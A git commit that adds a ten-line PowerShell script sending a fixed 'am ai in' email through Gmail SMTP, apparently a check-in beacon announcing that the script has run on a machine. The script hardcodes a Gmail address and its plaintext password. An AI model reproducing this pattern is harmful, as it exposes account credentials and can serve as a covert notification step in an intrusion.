70a8d5a9129dc773ec5cf568c57f133c80a2b464
Shell-Power <93724230+Shell-Power@users.noreply.github.com>
2021-11-05 22:24:35 +0530

    Add files via upload

---
+++ info.ps1
@@ -0,0 +1,10 @@
+﻿$EmailFrom = “adityagubbala747@gmail.com”
+$EmailTo = “adityaboeing777@gmail.com”
+$Subject = “yo boi”
+$Body = “am ai in”
+
+$SMTPServer = “smtp.gmail.com”
+$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPClient.EnableSsl = $true
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(“adityagubbala747@gmail.com”, “Aeroplane”);
+$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
